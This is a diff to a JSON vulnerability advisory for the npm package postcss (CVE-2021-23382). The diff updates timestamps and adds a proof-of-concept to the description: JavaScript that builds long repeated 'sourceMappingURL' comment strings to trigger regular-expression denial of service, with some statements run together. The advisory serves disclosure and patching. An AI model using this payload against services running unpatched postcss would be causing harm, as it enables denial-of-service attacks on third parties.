@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2022-02-23T20:31:16Z",
+  "UpdatedAt": "2023-09-08T19:35:15Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "postcss"
@@ -39,12 +39,12 @@
         "Value": "CVE-2021-23382"
       }
     ],
-    "Description": "The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \\/\\*\\s* sourceMappingURL=(.*).",
+    "Description": "The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \n```regex\n\\/\\*\\s* sourceMappingURL=(.*)\n```\n\n### PoC\n```js\nvar postcss = require(\"postcss\")\nfunction build_attack(n) {\n    var ret = \"a{}\"\n    for (var i = 0; i \u003c n; i++) {\n        ret += \"/*# sourceMappingURL=\"\n    }\n    return ret + \"!\";\n}\n```\n```js\npostcss.parse('a{}/*# sourceMappingURL=a.css.map */') for (var i = 1; i \u003c= 500000; i++) {\n    if (i % 1000 == 0) {\n        var time = Date.now();\n        var attack_str = build_attack(i) try {\n            postcss.parse(attack_str) var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        } catch (e) {\n            var time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost + \" ms\");\n        }\n    }\n}\n```",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2022-01-07T00:21:36Z",
     "Severity": "MODERATE",
     "Summary": "Regular Expression Denial of Service in postcss",
-    "UpdatedAt": "2023-02-01T05:05:43Z",
+    "UpdatedAt": "2023-09-08T19:35:15Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 5.3,
